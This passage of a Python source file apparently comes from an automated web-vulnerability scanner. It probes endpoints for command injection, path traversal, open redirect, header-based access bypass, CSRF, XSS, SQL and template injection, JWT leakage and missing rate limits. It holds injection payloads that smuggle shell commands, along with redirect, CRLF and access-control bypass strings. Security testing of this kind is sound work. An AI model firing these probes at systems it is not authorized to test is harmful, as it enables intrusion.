    marker = "briar_" + "".join(random.choices(string.ascii_lowercase, k=8))

    payloads = [
        f"|echo {marker}",
        f";echo {marker}",
        f"`echo {marker}`",
        f"$(echo {marker})",
        f"\necho {marker}",
        f"||echo {marker}",
        f"&&echo {marker}",
        f"& echo {marker} &",
    ]

    for payload in payloads:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        result = await _request(client, method, inject_url, post_data)
        if result is None:
            continue
        _, body, _ = result
        if marker in body and marker not in baseline.body:
            return {
                "detection": "output-reflection",
                "payload": payload,
                "evidence": (
                    f"Unique echo marker {marker!r} found in response — "
                    f"OS command was executed and output reflected"
                ),
                "marker": marker,
            }

    return None


async def _detect_path_traversal(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
) -> Optional[Dict[str, Any]]:
    """Path traversal detection via /etc/passwd and win.ini content reflection."""
    for payload, os_type in PATH_TRAVERSAL_CANARIES:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        result = await _request(client, method, inject_url, post_data)
        if result is None:
            continue
        _, body, _ = result
        if _PATH_TRAVERSAL_RE.search(body):
            m = _PATH_TRAVERSAL_RE.search(body)
            return {
                "detection": "content-reflection",
                "payload": payload,
                "evidence": (
                    f"System file content in response: {m.group(0)[:60]!r} — "
                    f"path traversal to {'Unix' if os_type == 'unix' else 'Windows'} system file succeeded"
                ),
                "os_type": os_type,
            }
    return None


# ── Open redirect bypass payloads ─────────────────────────────────────────────
#
# Progressive from basic → advanced bypass techniques.  Stop on first hit.
# The canary domain is our signal; encoding / scheme tricks defeat naive filters.

_OPEN_REDIRECT_CANARY = "briar-evil-redirect-canary.example.com"

_REDIRECT_PAYLOADS: List[str] = [
    # Basic
    f"https://{_OPEN_REDIRECT_CANARY}/",
    # Protocol-relative (works when host strips leading scheme check)
    f"//{_OPEN_REDIRECT_CANARY}/",
    # Backslash — some parsers treat \ as / in paths
    f"/\\{_OPEN_REDIRECT_CANARY}/",
    # URL-encoded slash after scheme
    f"https://{_OPEN_REDIRECT_CANARY}%2F",
    # Double-encoded
    f"https://{_OPEN_REDIRECT_CANARY}%252F",
    # Scheme without double-slash (IIS/ASP quirk)
    f"https:{_OPEN_REDIRECT_CANARY}/",
    # CRLF injection in redirect value
    f"https://{_OPEN_REDIRECT_CANARY}/%0d%0aSet-Cookie:briar=1",
    # Tab prefix (bypasses simple startswith check)
    f"\thttps://{_OPEN_REDIRECT_CANARY}/",
    # Credential-in-URL trick (legit@evil)
    f"https://legit-site.com@{_OPEN_REDIRECT_CANARY}/",
    # Allowlist bypass: crypto/blockchain sites (common in Juice Shop challenges)
    f"https://blockchain.info/address/{_OPEN_REDIRECT_CANARY}",
    f"https://etherscan.io/tx/{_OPEN_REDIRECT_CANARY}",
]

# Known redirect parameter names — for aggressive endpoint-level probing
_REDIRECT_PARAM_NAMES: List[str] = [
    "redirect", "redirect_to", "redirect_url", "redirectUrl", "redirectTo",
    "to", "url", "next", "next_url", "nextUrl",
    "return", "return_url", "returnUrl", "return_to",
    "location", "goto", "go", "continue", "dest", "destination",
    "forward", "callback", "callback_url", "link", "target", "out",
    "ref", "referer", "referrer", "href", "src",
]


async def _detect_open_redirect(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
) -> Optional[Dict[str, Any]]:
    """Open redirect detection — tests multiple bypass payloads per parameter."""
    for payload in _REDIRECT_PAYLOADS:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        try:
            if method.upper() == "POST" and post_data:
                resp = await client.post(inject_url, data=post_data,
                                         timeout=REQUEST_TIMEOUT, follow_redirects=False)
            else:
                resp = await client.get(inject_url,
                                        timeout=REQUEST_TIMEOUT, follow_redirects=False)

            location = resp.headers.get("location", "")
            if _OPEN_REDIRECT_CANARY in location:
                return {
                    "detection": "header-reflection",
                    "payload":   payload,
                    "bypass":    payload != f"https://{_OPEN_REDIRECT_CANARY}/",
                    "evidence": (
                        f"Location header reflects injected URL: {location!r} — "
                        f"open redirect confirmed via bypass payload, status {resp.status_code}"
                    ),
                }
        except Exception:
            continue

    return None


async def _detect_open_redirect_aggressive(
    client: "httpx.AsyncClient",
    url: str,
) -> Optional[Dict[str, Any]]:
    """
    Endpoint-level aggressive open redirect probe.

    Injects canary into well-known redirect params (?redirect=, ?to=, ?next=, …)
    regardless of whether arjun discovered them — these are invisible to parameter
    discovery because they only manifest on redirect-capable endpoints.
    Also tests /redirect?to= and /api/redirect?url= path patterns.
    """
    import urllib.parse as _urllib_parse

    canary    = f"https://{_OPEN_REDIRECT_CANARY}/"
    parsed    = urlparse(url)
    base_path = urlunparse(parsed._replace(query="", fragment="")).rstrip("/")

    # Probe known redirect params on the endpoint's own path
    for param in _REDIRECT_PARAM_NAMES:
        probe = f"{base_path}?{param}={_urllib_parse.quote(canary)}"
        try:
            resp = await client.get(probe, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            location = resp.headers.get("location", "")
            if _OPEN_REDIRECT_CANARY in location:
                return {
                    "detection": "aggressive-param-probe",
                    "param":     param,
                    "payload":   canary,
                    "evidence": (
                        f"Endpoint-level redirect probe ?{param}=<canary> → "
                        f"Location: {location!r} — open redirect confirmed"
                    ),
                    "owasp": "A01:2021 – Broken Access Control (Open Redirect)",
                }
        except Exception:
            continue

    # Probe dedicated redirect paths common in Express / Node / Java apps
    origin = f"{parsed.scheme}://{parsed.netloc}"
    redirect_paths = [
        f"/redirect?to={_urllib_parse.quote(canary)}",
        f"/redirect?url={_urllib_parse.quote(canary)}",
        f"/go?url={_urllib_parse.quote(canary)}",
        f"/out?url={_urllib_parse.quote(canary)}",
        f"/link?url={_urllib_parse.quote(canary)}",
        f"/api/redirect?to={_urllib_parse.quote(canary)}",
        f"/rest/redirect?url={_urllib_parse.quote(canary)}",
    ]
    for path in redirect_paths:
        try:
            resp = await client.get(
                origin + path, timeout=REQUEST_TIMEOUT, follow_redirects=False
            )
            location = resp.headers.get("location", "")
            if _OPEN_REDIRECT_CANARY in location:
                return {
                    "detection": "dedicated-redirect-path",
                    "param":     "url/to",
                    "payload":   canary,
                    "evidence": (
                        f"Dedicated redirect endpoint {path} → "
                        f"Location: {location!r} — open redirect confirmed"
                    ),
                    "owasp": "A01:2021 – Broken Access Control (Open Redirect)",
                }
        except Exception:
            continue

    return None


async def _detect_header_injection(
    client: "httpx.AsyncClient",
    url: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    Detect HTTP header injection vulnerabilities:
      1. Host header poisoning — server reflects Host in response/links
      2. X-Forwarded-Host override — same, via proxy header
      3. Auth bypass via X-Original-URL / X-Rewrite-URL (path override)
      4. IP-based access bypass via X-Forwarded-For: 127.0.0.1
    """
    canary_host = "briar-header-canary.example.com"

    # ── 1. Host / X-Forwarded-Host ────────────────────────────────────────
    for header_name in ("Host", "X-Forwarded-Host", "X-Host"):
        try:
            resp = await client.get(url, headers={header_name: canary_host},
                                    timeout=REQUEST_TIMEOUT)
            body = resp.text
            location = resp.headers.get("location", "")
            if canary_host in body or canary_host in location:
                return {
                    "detection":    "host-header-injection",
                    "payload":      f"{header_name}: {canary_host}",
                    "evidence": (
                        f"Injected {header_name} value {canary_host!r} reflected in "
                        f"{'Location header' if canary_host in location else 'response body'} — "
                        f"Host header injection / password-reset link poisoning"
                    ),
                }
        except Exception:
            pass

    # ── 2. X-Original-URL auth bypass (Nginx/IIS path override) ──────────
    restricted_paths = ["/admin", "/admin/", "/management", "/api/admin", "/api/v1/admin"]
    for bypass_path in restricted_paths:
        try:
            resp_bypass = await client.get(
                url,
                headers={"X-Original-URL": bypass_path, "X-Rewrite-URL": bypass_path},
                timeout=REQUEST_TIMEOUT,
            )
            resp_direct = await client.get(url + bypass_path.rstrip("/"),
                                           timeout=REQUEST_TIMEOUT)
            # If the bypass returns 200 but direct request returns 403/404 → bypass
            if (resp_bypass.status_code == 200
                    and resp_direct.status_code in (403, 404, 401)
                    and len(resp_bypass.text) > 50):
                return {
                    "detection":    "path-bypass",
                    "payload":      f"X-Original-URL: {bypass_path}",
                    "evidence": (
                        f"X-Original-URL: {bypass_path} → 200 OK "
                        f"(direct request {resp_direct.status_code}) — "
                        f"path override bypasses access control"
                    ),
                }
        except Exception:
            pass

    # ── 3. X-Forwarded-For: 127.0.0.1 IP allowlist bypass ────────────────
    try:
        resp_xff = await client.get(
            url,
            headers={"X-Forwarded-For": "127.0.0.1",
                     "X-Real-IP": "127.0.0.1",
                     "Client-IP": "127.0.0.1"},
            timeout=REQUEST_TIMEOUT,
        )
        if (baseline.status in (401, 403)
                and resp_xff.status_code in (200, 201, 302)):
            return {
                "detection":    "ip-bypass",
                "payload":      "X-Forwarded-For: 127.0.0.1",
                "evidence": (
                    f"HTTP {baseline.status} → {resp_xff.status_code} when "
                    f"X-Forwarded-For: 127.0.0.1 — IP-based allowlist bypass"
                ),
            }
    except Exception:
        pass

    return None


async def _detect_csrf(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    baseline: Baseline,
    auth_headers: Dict[str, str],
) -> Optional[Dict[str, Any]]:
    """
    Detect CSRF vulnerabilities on state-changing endpoints.

    Checks:
      1. Cross-origin POST accepted without CSRF token (JSON body w/ evil Origin)
      2. Cookies missing SameSite attribute in response Set-Cookie headers
      3. Endpoint accepts form-encoded POST when baseline expects JSON (JSON CSRF)
    """
    if method.upper() not in ("POST", "PUT", "PATCH", "DELETE"):
        return None

    evil_origin = "https://evil-csrf-canary.example.com"

    # ── 1. Cross-origin request accepted ─────────────────────────────────
    try:
        csrf_headers = {
            **auth_headers,
            "Origin":  evil_origin,
            "Referer": evil_origin + "/",
            "Content-Type": "application/json",
        }
        resp = await client.request(method, url, content="{}", headers=csrf_headers,
                                    timeout=REQUEST_TIMEOUT)
        cors_allow = resp.headers.get("access-control-allow-origin", "")
        # If the origin is reflected or wildcard AND the status is success → CSRF risk
        if resp.status_code in (200, 201, 204) and (
            cors_allow == "*" or evil_origin in cors_allow
        ):
            return {
                "detection": "cors-csrf",
                "payload":   f"Origin: {evil_origin}",
                "evidence": (
                    f"POST from evil origin {evil_origin!r} returned {resp.status_code} "
                    f"with CORS: {cors_allow!r} — CORS policy allows cross-origin state changes"
                ),
            }
    except Exception:
        pass

    # ── 2. Missing SameSite on session cookies ────────────────────────────
    try:
        resp = await client.get(url, timeout=REQUEST_TIMEOUT)
        for sc in resp.headers.get_list("set-cookie"):
            if sc and "samesite" not in sc.lower():
                if any(kw in sc.lower() for kw in ("session", "token", "auth", "jwt", "connect.sid")):
                    return {
                        "detection": "missing-samesite",
                        "payload":   "N/A",
                        "evidence": (
                            f"Session cookie missing SameSite attribute: {sc[:120]!r} — "
                            f"vulnerable to CSRF on browsers without strict defaults"
                        ),
                    }
    except Exception:
        pass

    return None


async def _detect_xss(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    Lightweight XSS surface detection — checks if input is reflected unescaped.
    Does NOT confirm exploitability (that's dalfox's job).
    """
    marker = "briar_xss_" + "".join(random.choices(string.ascii_lowercase, k=6))
    payload = f"<{marker}>"

    inject_url, post_data = _inject_param(url, params, param_name, payload, method)
    result = await _request(client, method, inject_url, post_data)
    if result is None:
        return None
    _, body, _ = result

    # Check if our tag is reflected literally (not HTML-escaped)
    if payload in body and payload not in baseline.body:
        return {
            "detection": "html-reflection",
            "payload": payload,
            "evidence": (
                f"Tag {payload!r} reflected unescaped in response — "
                f"XSS surface confirmed, route to dalfox for payload crafting"
            ),
        }
    return None


# ── Endpoint extractor ─────────────────────────────────────────────────────────

def _extract_targets(
    endpoints: List[str],
    arjun_results: List[Dict[str, Any]],
    target: str,
    json_endpoint_map: Optional[Dict[str, Dict[str, Any]]] = None,
) -> List[EndpointTarget]:
    """
    Build EndpointTarget list from raw endpoints + arjun discoveries.
    Deduplicates, scores, and caps at MAX_ENDPOINTS.
    """
    seen: Set[str] = set()
    targets: List[EndpointTarget] = []

    # Build arjun param map: url → [param_names]
    arjun_map: Dict[str, List[str]] = {}
    for r in arjun_results:
        ep_url = r.get("url", "")
        ep_params = r.get("parameters", [])
        if ep_url and ep_params:
            arjun_map[ep_url] = ep_params

    def _process(url: str, extra_params: Optional[List[str]] = None):
        nonlocal targets
        if url in seen:
            return
        seen.add(url)

        p = urlparse(url)
        qs_params: Dict[str, List[str]] = {}
        if p.query:
            qs_params = dict(parse_qs(p.query, keep_blank_values=True))

        # Merge arjun-discovered hidden params
        for param_name in (arjun_map.get(url, []) + (extra_params or [])):
            if param_name not in qs_params:
                qs_params[param_name] = ["1"]  # placeholder value

        if not qs_params:
            # If URL has integer path segments it's still IDOR/SQLi candidate
            parts = [s for s in p.path.split("/") if s]
            has_int = any(s.isdigit() for s in parts)
            if has_int:
                pass  # path-param endpoint, continue below
            elif any(p.path.startswith(pfx) for pfx in ("/rest/", "/api/", "/v1/", "/v2/", "/v3/")):
                # REST API endpoint with no discovered params — seed with common
                # high-value param names as fallback injection candidates.
                # These are the most frequently exploitable params on REST APIs.
                for fallback in ("q", "search", "id", "email", "name", "comment",
                                 "couponCode", "quantity", "userId"):
                    qs_params[fallback] = ["1"]
            else:
                return  # No params + no IDs → not interesting for injection

        # Cap params per endpoint — keep highest-priority ones when over limit.
        # Priority: short names first (id, q, src) then longer custom names.
        # No name-dictionary lookup — just length + common single-char preference.
        if len(qs_params) > MAX_PARAMS_PER_EP:
            def param_prio(name: str) -> int:
                n = name.lower()
                if len(n) <= 3:  return 0   # id, q, to, v, src …
                if len(n) <= 8:  return 1   # search, email, filter …
                return 2
            sorted_names = sorted(qs_params.keys(), key=param_prio)[:MAX_PARAMS_PER_EP]
            qs_params = {k: qs_params[k] for k in sorted_names}

        score, vuln_types = score_endpoint(url, qs_params)

        # If arjun found params on this endpoint via POST, test as POST.
        # REST APIs accept JSON bodies — GET-only misses most injection surfaces.
        arjun_method = None
        for r in arjun_results:
            if r.get("url") == url and r.get("method", "GET").upper() == "POST":
                arjun_method = "POST"
                break
        method = arjun_method or "GET"

        # Canonical URL without query string (for dedup)
        base_url = urlunparse(p._replace(query=""))

        targets.append(EndpointTarget(
            url=base_url,
            method=method,
            params=qs_params,
            score=score,
            vuln_types=vuln_types,
        ))

    def _process_json_endpoint(url: str, json_body: Dict[str, Any], method: str):
        """Register a REST API POST endpoint with JSON body for injection testing."""
        if url in seen:
            return
        seen.add(url)
        if not json_body:
            return
        p = urlparse(url)
        base_url = urlunparse(p._replace(query=""))
        score, vuln_types = score_endpoint(url, {k: [str(v)] for k, v in json_body.items()})
        targets.append(EndpointTarget(
            url=base_url,
            method=method,
            params={},
            json_body=json_body,
            score=score + 2,  # boost: REST JSON endpoints are high-value
            vuln_types=vuln_types,
        ))

    # Process all endpoints
    for ep in endpoints:
        _process(ep)

    # Also process arjun-discovered params on URLs that might not be in endpoints
    for arjun_url in arjun_map:
        _process(arjun_url)

    # Process JSON body endpoints from katana (REST API POST requests with JSON body)
    if json_endpoint_map:
        for json_url, json_body in json_endpoint_map.items():
            _process_json_endpoint(json_url, json_body, "POST")

    # Sort by score descending — test most promising targets first
    targets.sort(key=lambda t: t.score, reverse=True)
    return targets[:MAX_ENDPOINTS]


# ── Finding builder ────────────────────────────────────────────────────────────

_FINDING_TYPE_META: Dict[str, Dict[str, Any]] = {
    "sqli_candidate": {
        "severity": SeverityLevel.high,
        "route_to":  "sqlmap",
        "owasp":     "A03:2021 – Injection",
    },
    "ssti_candidate": {
        "severity": SeverityLevel.critical,
        "route_to":  "tplmap",
        "owasp":     "A03:2021 – Injection",
    },
    "cmdi_candidate": {
        "severity": SeverityLevel.critical,
        "route_to":  "commix",
        "owasp":     "A03:2021 – Injection",
    },
    "path_traversal": {
        "severity": SeverityLevel.high,
        "route_to":  "nuclei",
        "owasp":     "A01:2021 – Broken Access Control",
    },
    "open_redirect": {
        "severity": SeverityLevel.medium,
        "route_to":  "nuclei",
        "owasp":     "A01:2021 – Broken Access Control",
    },
    "xss_candidate": {
        "severity": SeverityLevel.medium,
        "route_to":  "dalfox",
        "owasp":     "A03:2021 – Injection",
    },
    "ssrf_candidate": {
        "severity": SeverityLevel.high,
        "route_to":  "nuclei",
        "owasp":     "A10:2021 – SSRF",
    },
    "nosql_candidate": {
        "severity": SeverityLevel.high,
        "route_to":  "nuclei",
        "owasp":     "A03:2021 – Injection",
    },
    "mass_assignment": {
        "severity": SeverityLevel.high,
        "route_to":  "nuclei",
        "owasp":     "A06:2023 – Mass Assignment (API6:2023)",
    },
    "header_injection": {
        "severity": SeverityLevel.high,
        "route_to":  None,
        "owasp":     "A05:2021 – Security Misconfiguration",
    },
    "csrf": {
        "severity": SeverityLevel.medium,
        "route_to":  None,
        "owasp":     "A01:2021 – Broken Access Control",
    },
}


def _build_finding(
    ep: EndpointTarget,
    param_name: str,
    finding_type: str,
    detection_detail: Dict[str, Any],
) -> Dict[str, Any]:
    meta = _FINDING_TYPE_META[finding_type]
    param_url = ep.url
    if ep.params:
        qs = urlencode({k: v[0] for k, v in ep.params.items()})
        param_url = f"{ep.url}?{qs}"

    return {
        "url":      param_url,
        "type":     finding_type,
        "severity": meta["severity"],
        "description": (
            f"[inspector] {finding_type.upper()} — parameter '{param_name}' "
            f"on {ep.url} | Method: {detection_detail['detection']} | "
            f"{detection_detail['evidence']}"
        ),
        "raw_output": {
            "url":          ep.url,
            "parameter":    param_name,
            "method":       ep.method,
            "payload":      detection_detail.get("payload", ""),
            "evidence":     detection_detail.get("evidence", ""),
            "detection":    detection_detail.get("detection", ""),
            "finding_type": finding_type,
            "route_to":     meta["route_to"],
            "owasp":        meta["owasp"],
            "engine":       detection_detail.get("engine"),
            "os_type":      detection_detail.get("os_type"),
            "route_context": {
                "param":   param_name,
                "method":  ep.method,
                "payload": detection_detail.get("payload", ""),
            },
        },
    }


# ── JSON body injection helpers ───────────────────────────────────────────────


async def _detect_sqli_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """SQLi detection via JSON body injection — tests error-based and time-based."""
    for payload in ("'", '"', "')", "'))", "';--", '";--'):
        modified = _inject_json_field(json_body, field_name, payload)
        result = await _request(client, "POST", url, data=modified, json_body=True)
        if result is None:
            continue
        _, body, _ = result
        if _SQL_ERROR_RE.search(body):
            m = _SQL_ERROR_RE.search(body)
            return {
                "detection": "error-based",
                "payload": payload,
                "evidence": f"DB error in JSON response: {(m.group(0) if m else '')[:60]}",
            }

    for payload in SQL_TIME_CANARIES:
        modified = _inject_json_field(json_body, field_name, payload)
        result = await _request(
            client, "POST", url, data=modified, json_body=True,
            timeout=REQUEST_TIMEOUT + 5,
        )
        if result is None:
            continue
        _, _, elapsed = result
        delay = elapsed - (baseline.time_ms / 1000.0)
        if delay >= TIMING_THRESHOLD:
            return {
                "detection": "time-based",
                "payload": payload,
                "evidence": (
                    f"JSON body injection delayed response by {delay:.2f}s "
                    f"(baseline: {baseline.time_ms:.0f}ms)"
                ),
            }
    return None


async def _detect_xss_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """XSS surface detection via JSON body field — checks if input reflects unescaped."""
    marker = "briar_xss_" + "".join(random.choices(string.ascii_lowercase, k=6))
    payload = f"<{marker}>"
    modified = _inject_json_field(json_body, field_name, payload)
    result = await _request(client, "POST", url, data=modified, json_body=True)
    if result is None:
        return None
    _, body, _ = result
    if payload in body and payload not in baseline.body:
        return {
            "detection": "html-reflection",
            "payload": payload,
            "evidence": (
                f"Tag {payload!r} reflected unescaped in JSON response — "
                f"XSS surface in JSON body field"
            ),
        }
    return None


async def _detect_ssti_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
) -> Optional[Dict[str, Any]]:
    """SSTI detection via JSON body field injection."""
    for payload, expected, engine in SSTI_CANARIES:
        modified = _inject_json_field(json_body, field_name, payload)
        result = await _request(client, "POST", url, data=modified, json_body=True)
        if result is None:
            continue
        _, body, _ = result
        if expected in body:
            return {
                "detection": "math-eval",
                "payload": payload,
                "evidence": (
                    f"Expression {payload!r} evaluated to {expected!r} in JSON response — "
                    f"indicates {engine} template engine execution in JSON field"
                ),
                "engine": engine,
            }
        if _SSTI_ENGINE_RE.search(body):
            m = _SSTI_ENGINE_RE.search(body)
            return {
                "detection": "engine-error",
                "payload": payload,
                "evidence": f"Template engine error leaked in JSON response: {m.group(0)!r}",
                "engine": engine,
            }
    return None


def _build_json_finding(
    ep: EndpointTarget,
    field_name: str,
    finding_type: str,
    detection_detail: Dict[str, Any],
) -> Dict[str, Any]:
    """Build a finding dict for JSON body injection discoveries."""
    meta = _FINDING_TYPE_META[finding_type]
    return {
        "url":      ep.url,
        "type":     finding_type,
        "severity": meta["severity"],
        "description": (
            f"[inspector] {finding_type.upper()} (JSON body) — field '{field_name}' "
            f"on {ep.url} | Method: {detection_detail['detection']} | "
            f"{detection_detail['evidence']}"
        ),
        "raw_output": {
            "url":          ep.url,
            "parameter":    field_name,
            "method":       "POST",
            "payload":      detection_detail.get("payload", ""),
            "evidence":     detection_detail.get("evidence", ""),
            "detection":    detection_detail.get("detection", ""),
            "finding_type": finding_type,
            "route_to":     meta["route_to"],
            "owasp":        meta["owasp"],
            "inject_mode":  "json_body",
            "route_context": {
                "param":   field_name,
                "method":  "POST",
                "payload": detection_detail.get("payload", ""),
            },
        },
    }


# ── JWT detection helper ───────────────────────────────────────────────────────

async def _detect_jwt_tokens(
    target: str,
    auth_context: Dict[str, Any],
    endpoints: List[str],
) -> List[Dict[str, Any]]:
    """
    Scan for JWT tokens in:
      1. Existing auth_context headers/cookies (token already in hand)
      2. Probe baseline responses from the target for Set-Cookie / body JWTs

    Returns a list of jwt_found findings.
    """
    findings: List[Dict[str, Any]] = []
    seen_tokens: set = set()

    def _emit(token: str, url: str, param: str, source: str):
        if token in seen_tokens:
            return
        seen_tokens.add(token)
        findings.append({
            "url":      url,
            "type":     "jwt_found",
            "severity": SeverityLevel.info,
            "description": (
                f"[inspector] JWT token detected ({source}) in {param!r} at {url}. "
                f"Route to jwt_tool for algorithm confusion + weak-secret tests. "
                f"Token prefix: {token[:40]}…"
            ),
            "raw_output": {
                "url":           url,
                "token":         token,
                "param":         param,
                "source":        source,
                "finding_type":  "jwt_found",
                "route_to":      "jwt_tool",
                "route_context": {
                    "param":  param,
                    "method": "GET",
                    "payload": token,
                },
            },
        })

    # ── 1. Auth context scan ─────────────────────────────────────────────
    headers = auth_context.get("headers", {})
    auth_hdr = headers.get("Authorization") or headers.get("authorization", "")
    if auth_hdr.startswith("Bearer "):
        token = auth_hdr[7:].strip()
        if _JWT_RE.match(token):
            _emit(token, target, "Authorization", "auth_context:header")

    for c in auth_context.get("cookies", []):
        val = c.get("value", "")
        if _JWT_RE.match(val):
            _emit(val, target, c.get("name", "cookie"), "auth_context:cookie")

    # ── 2. Probe baseline responses for JWT leakage ──────────────────────
    if not _HTTPX_AVAILABLE:
        return findings

    probe_urls = list(dict.fromkeys([target] + (endpoints or [])[:5]))
    headers_map: Dict[str, str] = _build_headers(auth_context)

    async with httpx.AsyncClient(
        headers=headers_map,
        verify=False,
        follow_redirects=True,
        timeout=httpx.Timeout(REQUEST_TIMEOUT),
    ) as client:
        for url in probe_urls:
            try:
                resp = await client.get(url, timeout=REQUEST_TIMEOUT)

                # Set-Cookie headers
                for cookie_header in resp.headers.get_list("set-cookie"):
                    # Cookie value is after "=" and before ";" or end
                    m = re.search(r"=([^;]+)", cookie_header)
                    if m:
                        val = m.group(1).strip()
                        if _JWT_RE.match(val):
                            name_m = re.match(r"([^=]+)=", cookie_header)
                            cname = name_m.group(1).strip() if name_m else "session"
                            _emit(val, url, cname, "response:set-cookie")

                # Response body JSON keys
                content_type = resp.headers.get("content-type", "")
                if "json" in content_type:
                    try:
                        body = resp.json()
                        if isinstance(body, dict):
                            for key in _JWT_JSON_KEYS:
                                val = body.get(key, "")
                                if isinstance(val, str) and _JWT_RE.match(val):
                                    _emit(val, url, key, "response:json_body")
                    except Exception:
                        pass
                else:
                    # Plain body scan (e.g. HTML pages with embedded tokens)
                    body_text = resp.text
                    for match in _JWT_RE.finditer(body_text):
                        _emit(match.group(0), url, "body", "response:body")
                        break  # one per page is enough

            except Exception as exc:
                logger.debug(f"[inspector] JWT probe failed for {url}: {exc}")

    if findings:
        logger.info(f"[inspector] JWT detection: {len(findings)} token(s) found")

    return findings


# ── Rate-limit / race-condition detection ─────────────────────────────────────

async def _detect_rate_limit(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    Send 20 identical requests in parallel and check whether the server
    throttles any of them (429 / 503 / Retry-After header).  If all succeed
    with 2xx/3xx we flag a missing rate-limit finding.

    Also fires a naïve race-condition probe: send 10 simultaneous POST
    requests with a unique token value and report if >1 succeed (status < 400),
    which can indicate a time-of-check / time-of-use race.
    """
    _BURST = 20
    _RACE  = 10

    # ── Burst probe ───────────────────────────────────────────────────────────
    async def _one(_client, _url, _method):
        try:
            if _method.upper() in ("POST", "PUT", "PATCH"):
                r = await _client.request(_method.upper(), _url, json={}, timeout=10)
            else:
                r = await _client.request(_method.upper(), _url, timeout=10)
            return r.status_code
        except Exception:
            return 0

    tasks = [_one(client, url, method) for _ in range(_BURST)]
    statuses = await asyncio.gather(*tasks)

    # If server returned 429 or 503 for any request → rate-limit IS present
    if any(s in (429, 503) for s in statuses):
        return None  # protected

    ok_count = sum(1 for s in statuses if 200 <= s < 400)
    if ok_count < _BURST * 0.7:
        return None  # too many errors, indeterminate

    # All burst requests succeeded → missing rate-limit
    finding = {
        "description": (
            f"No rate-limiting detected: {_BURST} simultaneous requests to "
            f"{url} all returned 2xx/3xx (no 429/503 seen). "
            "Brute-force and credential-stuffing attacks are possible."
        ),
        "evidence": f"statuses={list(statuses)[:10]}",
        "technique": "burst_probe",
        "owasp": "A04:2021 – Insecure Design",
    }

    # ── Race-condition probe (POST-only endpoints) ─────────────────────────────
    if method.upper() in ("POST", "PUT", "PATCH"):
        import uuid as _uuid_mod
        race_token = str(_uuid_mod.uuid4())
        race_body  = {"race_probe_token": race_token, "quantity": 1}
        race_tasks = [
            _one(client, url, method) for _ in range(_RACE)
        ]
        race_stats = await asyncio.gather(*race_tasks)
        race_ok = sum(1 for s in race_stats if 200 <= s < 400)
        if race_ok > 1:
            finding["race_condition"] = True
            finding["race_successes"] = race_ok
            finding["description"] += (
                f" Additionally {race_ok}/{_RACE} simultaneous POST requests succeeded, "
                "indicating a possible race condition (TOCTOU)."
            )

    return finding


# ── Worker ─────────────────────────────────────────────────────────────────────

class InspectorWorker(BaseWorker):
    def __init__(self):
        super().__init__(tool_name="inspector", queue_name="scan.inspect.inspector")
        self.timeout = int(os.getenv("INSPECTOR_WORKER_TIMEOUT", "3600"))

    async def execute_tool(
        self,
        target: str,
        auth_context: Dict[str, Any],
        task_payload: Dict[str, Any],
    ) -> List[Dict[str, Any]]:

        if not _HTTPX_AVAILABLE:
            logger.error("httpx library not available — cannot run inspector")
            return []

        endpoints: List[str] = task_payload.get("endpoints", [])
        if not endpoints and target:
            endpoints = [target]

        # arjun results come through the normal endpoint injection mechanism
        # but we also support explicit arjun_results for richer context
        arjun_raw = task_payload.get("arjun_results", [])

        # M8: app-type adaptive strategy — derive forced vuln types from strategy
        # priority_types (e.g. API always tests sqli+cmdi regardless of param names).
        app_type  = task_payload.get("app_type", "unknown")
        framework = task_payload.get("framework")
        strategy  = get_strategy(app_type, "inspector", framework)
        # priority_types use "_candidate" suffix; vuln_types inside EndpointTarget do not
        priority_types: List[str] = strategy.get("priority_types", [])
        # "sqli_candidate" → "sqli",  "open_redirect" → "open_redirect" (no suffix)
        forced_vuln_types: List[str] = [
            t.replace("_candidate", "") for t in priority_types
        ]
        if forced_vuln_types:
            logger.info(
                f"[inspector] M8 forced vuln types "
                f"(app_type={app_type!r}): {forced_vuln_types}"
            )

        # Load JSON body context from katana's captured POST requests.
        # Katana with -aff and -xhr captures XHR/fetch calls including JSON bodies.
        # These are stored in scan_results.raw_output.params.json for tool=katana.
        # The inspector uses them to test REST API JSON body parameters for injection.
        scan_id: str = task_payload.get("scan_id", "")
        json_endpoint_map: Dict[str, Dict[str, Any]] = {}
        if scan_id:
            try:
                from shared.models import ScanResultORM
                from sqlalchemy import select
                from uuid import UUID as _UUID
                async with self.session_factory() as _s:
                    stmt = (
                        select(ScanResultORM.url, ScanResultORM.raw_output)
                        .where(
                            ScanResultORM.scan_id == _UUID(scan_id),
                            ScanResultORM.tool == "katana",
                            ScanResultORM.vulnerability_type == "endpoint",
                        )
                    )
                    rows = await _s.execute(stmt)
                    for row_url, row_raw in rows:
                        if not row_url or not isinstance(row_raw, dict):
                            continue
                        params = row_raw.get("params", {})
                        json_body = params.get("json", {}) if isinstance(params, dict) else {}
                        if isinstance(json_body, dict) and json_body:
                            json_endpoint_map[row_url] = json_body
                logger.info(
                    f"[inspector] Found {len(json_endpoint_map)} katana endpoint(s) "
                    f"with JSON body context for injection testing"
                )
            except Exception as exc:
                logger.debug(f"[inspector] JSON endpoint query failed: {exc}")

        # Load OpenAPI-schema parameters from api_endpoint findings saved by katana.
        # This feeds injection testing even when arjun finds nothing — the spec
        # tells us exactly what params exist on every documented endpoint.
        openapi_param_map: Dict[str, List[str]] = {}
        if scan_id:
            try:
                from shared.models import ScanResultORM
                from sqlalchemy import select, or_
                from uuid import UUID as _UUID
                async with self.session_factory() as _s:
                    stmt = (
